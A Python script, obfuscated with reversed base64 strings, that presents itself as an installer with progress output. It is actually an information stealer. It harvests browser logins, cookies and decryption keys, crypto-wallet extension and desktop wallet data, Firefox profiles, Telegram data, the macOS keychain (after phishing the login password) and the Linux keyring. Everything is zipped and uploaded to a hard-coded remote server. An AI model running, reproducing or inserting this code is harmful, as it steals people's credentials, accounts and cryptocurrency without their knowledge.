AG='==wLoN3cu8if'
AF='==AazFGZ'
AE='wlmeuEGZ'
AD='=8yc0VGbsF2dv0WdyR3YlxWZu8if'
AC='=8yc0VGbsF2dv8mcl52bN9if'
AB='h5WYs92c'
AA='=U3bn92c'
A9='=AjNzQWZlB3c'
A8='=g3ZfFmclB3b'
A7=ImportError
x='oN3c'
w='wlmeug2c'
v='wlmeugXZ'
u='hRmchV3Z'
t='wlmeuQ2Z'
s='=0WdyR3YlxWZ'
r='wlmeuwWZ'
q='vJXZu9Wb'
p='wlmeu4Wb'
o='lJ3bj9lbp92Y0lmY'
n='wlmeuQnY'
m='r'
l='==AcppnLtRXb'
k='4VGZuFWe'
j='j92Yj92Y'
i='=EmclB3b'
c='zVHZvhXZ'
b='=s2ch1WY0VWb'
a='==QakxWY2lmd'
Z=str
X='=U2ZkV2X0Z2bz9mcjlWb'
W='=0Wdp12byh2Y'
V='=EGdlJ2Xl12byh2Y'
U='=UmdhJnY'
T='l12byh2Y'
S='utf-8'
R='-m'
L='w'
K=False
H=True
G=open
E=print
C=None
import os as D,glob as y,base64 as z,traceback as A0,zipfile as d,shutil as M,re,json,subprocess as N,sys as B,argparse as AH
from threading import Thread as F
import string as A1,random
from concurrent.futures import ThreadPoolExecutor as AI,as_completed as AJ
O='==QZi1SZoNWYuF2Z'
A2='xY3LpBXYv02bj5SZoNWYuF2ZlxmZmVnc09yL6MHc0RHa'
AK='==QZtFmb'
AL='==QblR3c5N3Xn5Wa0FmclB3b'
e='lNWa2VGZ'
AM='=IXZzd3byJ2XiV2d'
A3='==QZwlHd'
AN='=UWdsFmd'
AO='==QZ09mb'
AP='n9Gb'
AQ='=Qnbl1GajFGd0F2L'
AR='=Qmcvd3czFGc'
AS='==QZslmZ'
P='=IzMul2d'
Q='ul2dyFGZ'
I='=gXdulGb'
AT='==QZslmZvJHU'
A4='==AdsVXYmVGR'
AU='=Qmb19mZgQ3buBSZslmZgUGdhR3UgwWYj9GT'
AV='=UGdhR3UgwWYj9GT'
AW='=QHc5J3YfN3b'
AX='==Qelt2XkVGdwlncj5WZ'
A5='==QY0FGRg4Wan9GT'
f='==QY0FGZf5Wan9Gb'
A6='zdmbpRHdlNFIu9Waz5WZ0hXRgwWYj9GT'
g='==wcll2av92Q'
AY='==QZnFmcvR3UgwWYj9GT'
AZ='==QZnFmcvR3cfxWYj9Gb'
Aa='==gYkxWZ2VGb'
Ab='wlmeuIGb'
B9='==way92d0VmT'
Y='=MnauMnZlJHc'
Ac='==QZnFmcvR3c'
Ad='==gbvl2cuVGd4VWL69Wb'
Ae='==AZJRHelRnbvNkclNXd'
Af='=AXa65iZmdGb'
Ag='=42bzpmLz5Wan9Gb'
Ah='==gYk5CN5V2a'
Ai='=IGZukDdyV2Y'
h='==AevZWZylmZ'
Aj='=UGdpxWcz5ycll2av92Y'
Ak='6Qmcvd3czFGU'
Al='==Qes52boRXdh1CIuACbjNHZ'
Am='=4ibpF2ZhBSeyRHIskncy92U'
An='=8yculWYoNWelt0L5JXYyJWaM9if'
Ao='wlmeuM2a'
Ap='=4Wahh2Y5V2a'
Aq='u92cq5icr9if'
Ar='=M3Zulmc5V2a'
As='==wL5JXYyJWaM9if'
At='==wLnlmZu92Yu8if'
Au='cdmbp1WYvJFXhRXYEBHcBxlf'
Av='lNmc192c'
Aw='=QWa'
Ax='lh2Yh5WYHByZulGbsFGdz5WS'
Ay='2AzM90jMz4Wa3lHc'
Az='=MjLz4yM90TZnFmcvR3U0VmcjV2U'
A_='=oQKikmZpRnclN2LlJWLlh2Yh5WYnJCKlxWamNXaugGdhBnLz9GIuJXd0VmcgACIgACIgAiC6kiZsV2coUGdhNWamlGdyV2YflnZpJXZ2BiZlRGIgACIKozSENVZoNWYuF2RgM3chx2YKogCz9GI0J3bw1Wa'
def A(str):
	if str==C:return
	return z.b64decode(str[::-1]).decode(S)
class J:
	def __init__(B,prin,o_p,de_i):B.prin=prin;B.o_p=o_p;B.de_i=de_i;B._ba_ur=A(A2)
	def gen_ran_str(C,len=5):A=A1.ascii_letters+A1.digits;B=''.join(random.choice(A)for B in range(len));return B
	def lg_err(B,error_message):import requests as C;D={A(e):B.de_i,A(A3):'error',A(AN):error_message};C.post(f"{B._ba_ur}/{A(AP)}",json=D)
	def clin(B,cl):
		A=cl
		if A:
			try:
				if B.o_p.isfile(A):D.remove(A)
				if B.o_p.isdir(A):M.rmtree(A)
			except:pass
	def ul_fi(B,fi_pa,br,t,n,p,cl=C):
		E=fi_pa;import requests as I;from urllib3.util import Retry;from requests.adapters import HTTPAdapter as J
		if B.o_p.isfile(E)is K:return
		try:
			L={A(AS):G(E,'rb')};F={A(e):B.de_i,A(AM):br,A(A3):t,A(AO):n}
			if p:F[A(AR)]=p
			D=I.Session();M=Retry(total=5,status_forcelist=[500,502,503,504],allowed_methods=['HEAD','GET','OPTIONS','POST'],backoff_factor=1);H=J(max_retries=M);D.mount('http://',H);D.mount('https://',H);C=D.post(B._ba_ur+A(AQ),data=F,files=L)
			if C.status_code<200 or C.status_code>=300:B.prin.set_error('Error 11: Unknown error');B.lg_err(f"error 11 {C.status_code} {C.content}")
		except:B.prin.set_error('Error -11: Unknown error');N=A0.format_exc();B.lg_err(f"error -11 {N}")
		B.clin(cl)
	def z_fol(A,fo_pa,out_pa):
		C=out_pa;B=fo_pa
		if A.o_p.isdir(B):
			if A.o_p.dirname(C):D.makedirs(A.o_p.dirname(C),exist_ok=H)
			with d.ZipFile(C,L,d.ZIP_DEFLATED)as G:
				for(E,J,I)in D.walk(B):
					for F in I:G.write(A.o_p.join(E,F),A.o_p.relpath(D.path.join(E,F),B))
	def ul_fol(B,fo_pa,fi_name,br,t,n,p,cl=C,cp=K):
		F=fi_name;C=fo_pa
		if B.o_p.isdir(C)is K:return
		if B.o_p.dirname(F):raise ValueError
		if cp:M.copytree(C,f"{C}_copy",dirs_exist_ok=H);C=f"{C}_copy"
		try:
			D=f"{A(O)}/{B.gen_ran_str()}/{F}";B.z_fol(C,D);B.ul_fi(D,br,t,n,p,cl);M.rmtree(B.o_p.dirname(D))
			if cp:M.rmtree(C)
		except:B.prin.set_error('Error -22: Unknown error');G=A0.format_exc();E(C);E(G);B.lg_err(f"error -22 {G}")
class B0(J):
	_cr_pas={A(Q):[('=8iKlxWam9mcQ9SZt9mcoN0Llx2Zv92RvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',T),('==wL0xWdhZWZE9SZt9mcoN0Llx2Zv92RvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',T),('==wLqUGbpZ2byB1LyV2c39mcC1SZ2FmcC9SZyF2d0Z2bTVmdhJnQvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',U),('vQHb1FmZlR0LyV2c39mcC1SZ2FmcC9SZyF2d0Z2bTVmdhJnQvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',U),('=8CdsVXYmVGRvEmclB3TuUmchdHdm92chJXZw9mLt92YvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',i),('==wLqUGbpZ2byB1LhRXZCBSZt9mcoN0Llx2Zv92RvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',V),('vQHb1FmZlR0LhRXZCBSZt9mcoN0Llx2Zv92RvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',V),('voSZslmZvJHUv0Wdp12byh2QvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',W),('=8CdsVXYmVGRv0Wdp12byh2QvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',W),('voSZslmZvJHUvU2ZkVEI0Z2bz9mcjlWTvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',X),('=8CdsVXYmVGRvU2ZkVEI0Z2bz9mcjlWTvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',X),('==wL0xWdhZWZE9CWHFmclB3TuUmchdHdm92chJXZw9mLt92YvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',A8),('==wL0xWdhZWZE9SakxWY2lmVvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',a),('vQHb1FmZlR0Lj92Yj92QvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',j),('=8CdsVXYmVGRvIXZzd3byJEelRmbhl1L4VGZuFWWvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',k),('0xWdhZWZE9SY0FGRgIXZzV1LjJXQvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if','jJXY')],A(P):[('==AXqUGbpZ2byBFXhRXYEBiclNXVcVWbvJHaDxVZsd2bvdEXsF2YvxEXhRXYEBHcBxlf',T),('cRHb1FmZlREXhRXYEBiclNXVcVWbvJHaDxVZsd2bvdEXsF2YvxEXhRXYEBHcBxlf',T),('=wlKlxWam9mcQxVY0FGRgIXZzVFXldGZFxFdm92cvJ3Yp1EXsF2YvxEXhRXYEBHcBxlf',X),('==AX0xWdhZWZExVY0FGRgIXZzVFXldGZFxFdm92cvJ3Yp1EXsF2YvxEXhRXYEBHcBxlf',X),('cpSZslmZvJHUcFGdhREIyV2cVxlclN3dvJnQtUmdhJnQcVmchdHdm92UlZXYyJEXsF2YvxEXhRXYEBHcBxlf',U),('=wFdsVXYmVGRcFGdhREIyV2cVxlclN3dvJnQtUmdhJnQcVmchdHdm92UlZXYyJEXsF2YvxEXhRXYEBHcBxlf',U),('cpSZslmZvJHUcFGdhREIyV2cVxVY0VmQgUWbvJHaDxVZsd2bvdEXsF2YvxEXhRXYEBHcBxlf',V),('=wFdsVXYmVGRcFGdhREIyV2cVxVY0VmQgUWbvJHaDxVZsd2bvdEXsF2YvxEXhRXYEBHcBxlf',V),('=wlKlxWam9mcQxVY0FGRgIXZzVFXtVXat9mcoNEXsF2YvxEXhRXYEBHcBxlf',W),('==AX0xWdhZWZExVY0FGRgIXZzVFXtVXat9mcoNEXsF2YvxEXhRXYEBHcBxlf',W),('==AXqUGbpZ2byBFXhRXYEBiclNXVcVWbvJHaDxVZt9mcoNGM2MDXsF2YvxEXhRXYEBHcBxlf',A9),('cRHb1FmZlREXhRXYEBiclNXVcVWbvJHaDxVZt9mcoNGM2MDXsF2YvxEXhRXYEBHcBxlf',A9),('=wlKlxWam9mcQxVY0FGRgIXZzVFXyV2c39mcCFVUcRnblNmblRFXsF2YvxEXhRXYEBHcBxlf','=EXc'),('==AX0xWdhZWZExVY0FGRgIXZzVFXyV2c39mcCFVUcRnblNmblRFXsF2YvxEXhRXYEBHcBxlf','=EXc'),('cRHb1FmZlREXlxmYhR3UgEmclB3TcVmchdHdm92UgEmclB3Tcdmbp1WYvJFXhRXYEBHcBxlf',i),('cRHb1FmZlREXlxmYhR3Ugg1RgEmclB3TcVmchdHdm92UgEmclB3Tcdmbp1WYvJFXhRXYEBHcBxlf',A8),('==AXqUGbpZ2byBFXhRXYEBiclNXVclGZsFmdpZFXsF2YvxEXhRXYEBHcBxlf',a),('cRHb1FmZlREXhRXYEBiclNXVclGZsFmdpZFXsF2YvxEXhRXYEBHcBxlf',a),('=wlKlxWam9mcQxVY0FGRgIXZzVFXyV2c39mcCx1YvN0YvNEXsF2YvxEXhRXYEBHcBxlf',j),('==AX0xWdhZWZExVY0FGRgIXZzVFXyV2c39mcCx1YvN0YvNEXsF2YvxEXhRXYEBHcBxlf',j),('=wlKlxWam9mcQxVY0FGRgIXZzVFXyV2c39mcChXZk5WYZxFelRmbhlFXsF2YvxEXhRXYEBHcBxlf',k),('==AX0xWdhZWZExVY0FGRgIXZzVFXyV2c39mcChXZk5WYZxFelRmbhlFXsF2YvxEXhRXYEBHcBxlf',k),('cpSZslmZvJHUcFGdhREIyV2cVxlclN3dvJnQDREXsF2YvxEXhRXYEBHcBxlf','=MGZ'),('=wFdsVXYmVGRcFGdhREIyV2cVxlclN3dvJnQDREXsF2YvxEXhRXYEBHcBxlf','=MGZ'),('cpSZslmZvJHUcRXarJWZXxlclJ3bsBHeFV3bn92Ucdmbp1WYvJFXhRXYEBHcBxlf',AA),('=wFdsVXYmVGRcRXarJWZXxlclJ3bsBHeFV3bn92Ucdmbp1WYvJFXhRXYEBHcBxlf',AA)],A(I):[('=8CdsVXYmVGRvUWbvJHaj1SZsd2bvd2LnlmZu92Yu8if',T),('vQHb1FmZlR0LtVXat9mcoN2LnlmZu92Yu8if',W),('vQHb1FmZlR0LldGZl1Cdm92cvJ3Yp12LnlmZu92Yu8if',X),('==wL0xWdhZWZE9iclN3dvJnQtUmdhJnQvUmchdHdm92UlZXYyJ0LnlmZu92Yu8if',U),('==wL0xWdhZWZE9SY0VmYtUWbvJHaj1SZsd2bvd2LnlmZu92Yu8if',V),('vQHb1FmZlR0LhJXZw92LnlmZu92Yu8if',i),('=8CdsVXYmVGRvkGZsFmdpZ3LnlmZu92Yu8if',a)]};mtm_ids=[('=k2YnJ2atVWZt5Wakh2Zn5Gbi92boNWZsd2arNGbjpGZ',l,b),('=0GatlmbqFWZlVWbsFGZjVGanxGajxGcvtWYixWYipWZ',l,b),('=4mbrdGcnZWZiR2br5mZlxGal9WYlF2ZvVmYmhWaitmb',l,b),('=gGckdGcwVWZi5GZiNmYk52bjRGajlGbnBnYqRWaqdWZ','wlmeucHd','0VGbsF2dfR3c1JHd'),('=MWZm9Gap9WZvtmbtx2aiVGcs52YwtWbtpmZkpWZuJWa','wlmeuwGd','=smbpxmbvJHd'),('=QWYh5GZr5mZuhWbupWajdGZkJmZvVmZj9mbr5WYm5Ga','wlmeuI2Y','=U2chJmbp92Y'),('=8mbkNGbklman1mYqtGap12boZmanpGbhlGZmBHbvhWY','==AcppnLvhXZ',c),('=oGbsV2Yo5GZvdmZjtmaq12bsB3alBHZjNWbnZWYmlGa','wlmeuI3Y','vRHc5J3Y'),('=8GZoZ2Zrl2Yud2aptmbmlGbslWZlBnap52aqJ2YmBHb','wlmeu0mb','==QatFmb'),('=EGcqx2brtGcohGcvpmbqdWbwxGatlWZt9WbsVWYuZmY','wlmeu82c',AB)];wd_ta_ki=['==QMm4jMgwUVOBiPgY2LgUGel5SZt9mcoNGItl2LgwGbpt2azFGd','xYiPyACTV5EI+AiZvASZ4VmLlZXYyJGItl2LgwGbpt2azFGd','==QMm4jMgwUVOBiPgY2LgUGel5SZnRWZz1GItl2LgwGbpt2azFGd','xYiPyACTV5EI+AiZvASZ4VmLhJXZw9GItl2LgwGbpt2azFGd']
	def __init__(A,_gl,prin,o_p,de_i):super().__init__(prin,o_p,de_i);A.gl=_gl
	def get_cr_pas(C):
		if B.platform in C._cr_pas:return[(A(B[0]),A(B[1]))for B in C._cr_pas[B.platform]]
		else:C.prin.print(f"{B.platform} is not supported");C.lg_err(f"{B.platform} is not supported");return[]
	def get_cr_pr_pa(A):
		B=[]
		for C in A.get_cr_pas():
			D=A.gl.glob(A.o_p.expanduser(C[0]))
			for E in D:B.append((E,C[1]))
		return B
	def get_cr_pr_no(F,pa):
		D='\\'if B.platform==A(P)else'/';E=pa.split(D)
		for C in E:
			if f"{A(AT)} "in C:return C
		return A(A4)
	def get_sk(E,pr):
		B=pr
		while H:
			if B==E.o_p.dirname(B):return A(AU)
			I=E.o_p.join(B,A(AV))
			if E.o_p.isfile(I):J=I;break
			B=E.o_p.dirname(B)
		try:
			import win32crypt as K
			with G(J,m,encoding=S)as L:F=L.read();F=json.loads(F)
			D=z.b64decode(F[A(AW)][A(AX)]);D=D[5:];D=K.CryptUnprotectData(D,C,C,C,0)[1];return D.hex()
		except Exception as M:return Z(M)
	def handle_xln(B,pr):
		D=pr;E=[];E.append(F(target=B.ul_fi,args=(B.o_p.join(D[0],A(A5)),D[1],A(f),B.get_cr_pr_no(D[0]),C)))
		for G in B.mtm_ids:H=F(target=B.ul_fol,args=(B.o_p.join(D[0],A(A6),A(G[0])),A(G[1]),D[1],A(G[2]),B.get_cr_pr_no(D[0]),C));E.append(H)
		E.append(F(target=B.ul_fi,args=(B.o_p.join(D[0],A(g)),D[1],A(g).lower(),B.get_cr_pr_no(D[0]),C)));E.append(F(target=B.ul_fol,args=(B.o_p.join(D[0],A(AY),A(Aa)),A(Ab),D[1],A(AZ),B.get_cr_pr_no(D[0]),C)));return E
	def handle_wd(B,pr):
		D=pr;E=[];I=B.get_sk(D[0]);E.append(F(target=B.ul_fi,args=(B.o_p.join(D[0],A(A5)),D[1],A(f),B.get_cr_pr_no(D[0]),I)))
		for G in B.mtm_ids:J=F(target=B.ul_fol,args=(B.o_p.join(D[0],A(A6),A(G[0])),A(G[1]),D[1],A(G[2]),B.get_cr_pr_no(D[0]),C,C,H));E.append(J)
		return E
	def run(A):
		E=A.get_cr_pr_pa();C=[]
		for D in E:
			if B.platform=='win32':C+=A.handle_wd(D)
			else:C+=A.handle_xln(D)
		return C
class B1(J):
	_fol_pas={A(Q):[('==wLzRXZsxWY39ibp92Y0lmQvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',n,o),(AC,p,q),(AD,r,s),('=8iYkxWZ2VGbvU2ZhJ3b0NFIsF2Yvx0LhRmchV3RvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',t,u),('vQXZsxWY35yc1R2b4V2LzVHZvhXRvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',v,c),('=8yc0VGbsF2dvUmcvNEazFGRvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if',AE,AF),(AG,w,x)],A(P):[('==AXzRXZsxWY3xlbp92Y0lmQcdmbp1WYvJFXhRXYEBHcBxlf',n,o),('=w1c0VGbsF2dcVmcvNEazFGRcdmbp1WYvJFXhRXYEBHcBxlf',AE,AF),('=w1c0VGbsF2dc1WdyR3YlxWRcdmbp1WYvJFXhRXYEBHcBxlf',r,s),('cRXZsxWY35yc1R2b4VGXzVHZvhXRcdmbp1WYvJFXhRXYEBHcBxlf',v,c),('cNHdlxGbhdHXvJXZu9WTcNHduVWb1N2bExlf',p,q),('=wlYkxWZ2VGbcV2ZhJ3b0NFIsF2YvxEXhRmchV3Rcdmbp1WYvJFXhRXYEBHcBxlf',t,u),('==AXoN3cuwlf',w,x)],A(I):[(AG,w,x),(AC,p,q),('=8yc0VGbsF2dv4WavNGdpJmLv42bt12bj9SZy92Yt4WavNGdpJ2LwFmbz9if',n,o),(AD,r,s),('vIGZsVmdlx2LldWYy9GdTBCbhN2bM9SYkJXY1d0LnlmZu92Yu8if',t,u),('==wL0VGbsF2duMXdk9Gel9yc1R2b4V0LnlmZu92Yu8if',v,c)]}
	def get_fol_pas(C):
		if B.platform in C._fol_pas:return[(A(B[0]),A(B[1]),A(B[2]))for B in C._fol_pas[B.platform]]
		else:C.prin.print(f"{B.platform} is not supported");C.lg_err(f"{B.platform} is not supported");return[]
	def run(A):
		D=[];E=A.get_fol_pas()
		for B in E:G=A.o_p.expanduser(B[0]);H=F(target=A.ul_fol,args=(G,B[1],C,B[2],C,C));D.append(H)
		return D
class B2(J):
	_ff_pas={A(Q):['zpmLzZWZyB3Lq8yclxWam9mcQ9CevZWZylmRvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if'],A(P):['=MnauMnZlJHccpCXzVGbpZ2byBFX49mZlJXaGxVYsxWa69WTcdmbp1WYvJFXhRXYEBHcBxlf'],A(I):['=MnauMnZlJHcvoyL49mZlJXam9SYsxWa69Wbu8if','==wcq5ycmVmcw9iKvg3bmVmcpZ2LhxGbpp3bt5yLu9Wbt92Yvg3bmVmcpZ2LwFmbz9if']};_mtm_id_regexes=[('==AXclyKdJiXbhiIcxlOiwFXvlmLrNXYtFGdl1GQu9Waz5WZ0hXZiV2d','=AXa65iZtRXb',b),('=wFXpsSXi41WoICXcpjIcxVfcNGZyEjYyUDO1EmM40iZ2UTYtQTZiRTL0U2Mi1SMhVWZyQzY3sHX','==AcppnLm92c',AB)]
	def __init__(A,_gl,prin,o_p,de_i):super().__init__(prin,o_p,de_i);A.gl=_gl
	def z_fis(A,fi_name,*F):
		B=fi_name
		if A.o_p.dirname(B):D.makedirs(A.o_p.dirname(B),exist_ok=H)
		E=K;G=list(F)
		with d.ZipFile(B,L)as I:
			for C in G:
				if A.o_p.isfile(C):E=H;I.write(C,A.o_p.basename(C))
		return E
	def get_ff_pas(C):
		if B.platform in C._ff_pas:return[A(B)for B in C._ff_pas[B.platform]]
		else:E(f"{B.platform} is not supported");C.lg_err(f"{B.platform} is not supported");return[]
	def get_ff_pr_pa(A):
		B=[]
		for C in A.get_ff_pas():D=A.gl.glob(A.o_p.expanduser(C));B+=[A.o_p.dirname(B)for B in D]
		return B
	def fd_wl_fol(B,pr):
		F=B.o_p.join(pr,A(Y));D=[]
		with G(F,m,encoding=S)as H:
			I=H.read()
			for C in B._mtm_id_regexes:
				E=re.search(A(C[0]),I)
				if E:id=E.group(1);J=B.o_p.join(pr,A(Ac),A(A4).lower(),f"{A(Ad)}+++{id}^{A(Ae)}=*");D+=[(B,A(C[1]),A(C[2]))for B in B.gl.glob(J)]
		return D
	def handle_lg(B,pr):
		D=pr;G=[];E=f"{A(O)}/{A(Af)}";I=B.z_fis(E,B.o_p.join(D,A(Ag)),B.o_p.join(D,A(Ah)),B.o_p.join(D,A(Ai)))
		if I:H=F(target=B.ul_fi,args=(E,A(h),A(f),B.o_p.basename(D),C,E));G.append(H)
		else:
			try:M.rmtree(B.o_p.dirname(E))
			except:pass
		H=F(target=B.ul_fi,args=(B.o_p.join(D,A(Aj)),A(h),A(g).lower(),B.o_p.basename(D),C));G.append(H);return G
	def handle_wl(B,pr):
		E=[]
		for D in B.fd_wl_fol(pr):M.copy(B.o_p.join(pr,A(Y)),B.o_p.join(D[0],A(Y)));G=B.o_p.join(D[0],A(Y));H=F(target=B.ul_fol,args=(D[0],D[1],A(h),D[2],B.o_p.basename(pr),C,G));E.append(H)
		return E
	def run(A):
		B=[]
		for C in A.get_ff_pr_pa():B+=A.handle_lg(C);B+=A.handle_wl(C)
		return B
class B3(J):
	def __init__(A,_subp,sp,prin,o_p,de_i):super().__init__(prin,o_p,de_i);A.subp=_subp;A.sp=sp
	def run(D):
		if B.platform!=A(Q):return
		import getpass as G
		if D.sp is C:
			I=K
			while I==K:
				try:E=G.getpass(prompt=A(Ak));J='{} {} "{}"'.format(A(Al),G.getuser(),E);L=D.subp.check_output(J,shell=H,stderr=D.subp.DEVNULL);I=L==''.encode(S)
				except:D.prin.print(A(Am))
		else:E=D.sp
		return F(target=D.ul_fol,args=(D.o_p.expanduser(A(An)),A(Ao),C,A(Ap),C,E))
class B4(J):
	def __init__(A,_ss,prin,o_p,de_i):super().__init__(prin,o_p,de_i);A.ss=_ss
	def run(E):
		if B.platform!=A(I):return
		K=E.ss.dbus_init();M=E.ss.get_default_collection(K);D='{'
		for J in M.get_all_items():D+='"'+J.get_label()+'":"'+J.get_secret().decode(S)+'",'
		if len(D)>1:D=D[:-1]
		D+='}';H=E.o_p.expanduser(A(Aq))
		with G(H,L)as N:N.write(D)
		return F(target=E.ul_fi,args=(H,C,A(Ar),C,C,H))
class B5:
	def __init__(A,message,rerun):A.message=message;A.rerun=rerun;A.progress=0;A.error_message=C
	def print(A,message):
		if A.progress==0 or A.progress==100:E(message)
	def set_error(A,error_message):A.error_message=error_message
	def add_progress(A,value):A.progress+=value;E(f"\r{A.message} {int(A.progress)}%",end='',flush=H)
	def cre_do_fi(E):
		B=A(O)
		if not D.path.exists(B):D.makedirs(B)
		with G(f"{A(O)}/certifi",L)as C:0
		with G(f"{A(O)}/sdk.py",L)as C:C.write(A(A_))
	def mark_complete(A):
		if A.error_message is C:
			A.progress=100;E(f"\r{A.message} 100%",end='',flush=H);E();E('Completed successfully');A.cre_do_fi()
			if A.rerun:E('Please hit Enter to continue')
		else:E();E(A.error_message);E('Installation failed, please try again or contact developer')
class B6:
	def __init__(C,printer,n,p):C.printer=printer;C._n=n;C._p=p;C.paths={A(Q):f"{A(As)}{C._n}",A(I):f"{A(At)}{C._n}",A(P):f"{A(Au)}{C._n}"};C._platform=A(I)if B.platform not in C.paths else B.platform
	def get_de_i(C):
		import getpass as H,requests as I;E=D.path.expanduser(C.paths[C._platform])
		if D.path.isfile(E):
			with G(E,m)as F:id=F.read();return id
		J={A(AK):H.getuser(),A(AL):B.platform,A(Av):C._n};K=I.post(f"{A(A2)}/{A(e)}s/",json=J);M=json.loads(K.content);id=M[A(Aw)]
		with G(E,L)as F:F.write(id);return id
	def clean_thrs(F,thrs):
		B=thrs
		for(E,A)in enumerate(B):
			if A is not C and hasattr(A._target,'__self__')and hasattr(A._target,'__func__'):
				if A._target.__func__==J.ul_fi or A._target.__func__==J.ul_fol:
					if D.path.exists(A._args[0])is K:B[E]=C
		return[A for A in B if A is not C]
	def exec_thrs(A,thrs):
		A.printer.add_progress(0)
		with AI(max_workers=5)as D:
			B=[]
			for C in thrs:B.append(D.submit(C._target,*C._args))
			for E in AJ(B):E.result();A.printer.add_progress(100/len(thrs))
	def start(C):
		F=C.get_de_i();E=[]
		if B.platform==A(Q):G=B3(N,C._p,C.printer,D.path,F);E.append(G.run())
		elif B.platform==A(I):import secretstorage as H;J=B4(H,C.printer,D.path,F);E.append(J.run())
		K=B0(y,C.printer,D.path,F);E+=K.run();L=B2(y,C.printer,D.path,F);E+=L.run();M=B1(C.printer,D.path,F);E+=M.run();E=C.clean_thrs(E);C.exec_thrs(E);C.printer.mark_complete()
def B7():
	E='install';C='pip'
	if B.platform==A(P):
		try:import win32crypt
		except A7:N.check_call([B.executable,R,C,E,A(Ay)]);B.argv.append('--re');D.execv(B.executable,[B.executable]+B.argv)
	try:import secretstorage,requests,urllib3
	except A7:
		with G(D.devnull,L)as F:
			if B.version_info[0]*10+B.version_info[1]>=37:N.check_call([B.executable,R,C,E,'requests==2.28.2'])
			else:N.check_call([B.executable,R,C,E,'requests'])
			N.check_call([B.executable,R,C,E,A(Az)],stdout=F,stderr=F);N.check_call([B.executable,R,C,E,'urllib3==1.26.14']);import urllib3,secretstorage,requests
def B8():
	B=AH.ArgumentParser();B.add_argument('-n',type=Z,default=A(O));B.add_argument('-p',type=Z,default=C);B.add_argument(R,type=Z,default=A(Ax));B.add_argument('--re',action='store_true');D=B.parse_args()
	if D.re:E()
	F=B5(D.m,D.re);G=B6(F,D.n,D.p);G.start()
if __name__=='__main__':B7();B8()